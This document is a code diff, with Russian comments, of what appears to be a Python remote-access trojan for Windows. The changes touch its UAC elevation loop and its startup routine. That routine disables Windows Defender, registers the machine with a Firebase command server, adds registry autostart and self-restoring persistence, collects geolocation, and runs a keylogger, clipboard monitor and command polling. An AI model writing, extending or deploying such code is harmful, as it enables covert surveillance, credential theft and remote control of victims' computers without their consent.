@@ -78,17 +78,21 @@ def _upload_single(file_path):
 
 # ---- ПОВЫШЕНИЕ ПРИВИЛЕГИЙ (UAC) ----
 def _elevate():
+    # Проверяем, уже ли мы админ
     if ctypes.windll.shell32.IsUserAnAdmin():
         return True
-    try:
-        exe = sys.executable if getattr(sys, 'frozen', False) else sys.executable
-        args = ' '.join(sys.argv[1:]) if len(sys.argv) > 1 else ''
-        ctypes.windll.shell32.ShellExecuteW(None, "runas", exe, args, None, 1)
-        return False
-    except:
-        return False
+    # Если уже есть флаг --elevated, значит что-то пошло не так
+    if '--elevated' in sys.argv:
+        # Не удалось получить права, выходим с ошибкой
+        print("Не удалось получить права администратора")
+        sys.exit(1)
+    # Перезапускаем себя с правами администратора и добавляем флаг
+    script = os.path.abspath(sys.argv[0])
+    params = f'"{script}" --elevated'
+    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
+    return False
 
-# ---- ОТКЛЮЧЕНИЕ DEFENDER (безопасное) ----
+# ---- ОТКЛЮЧЕНИЕ DEFENDER ----
 def _disable_defender():
     try:
         if not ctypes.windll.shell32.IsUserAnAdmin():
@@ -100,7 +104,7 @@ def _disable_defender():
     except Exception as e:
         return f'error: {e}'
 
-# ---- КОМАНДЫ (без паролей и Defender) ----
+# ---- КОМАНДЫ (без паролей) ----
 def _a():  # rickroll
     webbrowser.open(_d('aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1kUXc0dzlXZ1hDUQ=='))
 
@@ -538,13 +542,21 @@ class _Daemon:
     def run(self):
         # ---- ПОВЫШЕНИЕ ПРИВИЛЕГИЙ ----
         if not ctypes.windll.shell32.IsUserAnAdmin():
-            exe = sys.executable if getattr(sys, 'frozen', False) else sys.executable
-            args = ' '.join(sys.argv[1:]) if len(sys.argv) > 1 else ''
-            ctypes.windll.shell32.ShellExecuteW(None, "runas", exe, args, None, 1)
-            return  # текущий процесс завершится
+            # Если флаг --elevated уже есть, значит админ не получился
+            if '--elevated' in sys.argv:
+                print("❌ Не удалось получить права администратора")
+                sys.exit(1)
+            # Перезапускаем с правами
+            script = os.path.abspath(sys.argv[0])
+            params = f'"{script}" --elevated'
+            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
+            sys.exit(0)  # завершаем текущий процесс
 
         # ---- ТЕПЕРЬ МЫ АДМИН ----
+        print("✅ Запущено с правами администратора")
         def_status = _disable_defender()
+        print(f"🛡️ Defender: {def_status}")
+
         # --- ИНИЦИАЛИЗАЦИЯ FIREBASE ---
         self._init_fb()
         try:
@@ -557,8 +569,9 @@ class _Daemon:
                 'last_cmd_output': '',
                 'defender_status': def_status
             })
+            print(f"✅ Клиент {_USER_ID} зарегистрирован в Firebase")
         except Exception as e:
-            print(f'Reg error: {e}')
+            print(f'❌ Reg error: {e}')
 
         # Автозагрузка
         try:
@@ -566,26 +579,36 @@ class _Daemon:
             exe = sys.executable if getattr(sys, 'frozen', False) else f'"{sys.executable}" "{os.path.abspath(__file__)}"'
             winreg.SetValueEx(key, 'RemoteControl', 0, winreg.REG_SZ, exe)
             winreg.CloseKey(key)
-        except: pass
+            print("✅ Добавлено в автозагрузку")
+        except Exception as e:
+            print(f'❌ Автозагрузка: {e}')
+
         _create_persist()
+        print("✅ Самовосстановление включено")
 
         geo = _geo()
         if geo:
-            try: self._db.child(_CLIENT_PATH).update({'geo': geo})
+            try:
+                self._db.child(_CLIENT_PATH).update({'geo': geo})
+                print(f"📍 Геолокация: {geo.get('city')}, {geo.get('country')}")
             except: pass
 
         self._keylog = _KeyLogger(self._db)
         self._keylog.start()
+        print("⌨️ Кейлоггер запущен")
 
         try:
             import pyperclip
             self._clip_thread = threading.Thread(target=_clip_monitor, args=(self._db,), daemon=True)
             self._clip_thread.start()
-        except: pass
+            print("📋 Мониторинг буфера обмена запущен")
+        except:
+            pass
 
         threading.Thread(target=self._heartbeat, daemon=True).start()
         threading.Thread(target=self._poll, daemon=True).start()
         threading.Thread(target=self._tray_icon, daemon=True).start()
+        print("🚀 Все потоки запущены. Ожидание команд...")
 
         self._stop.wait()
 
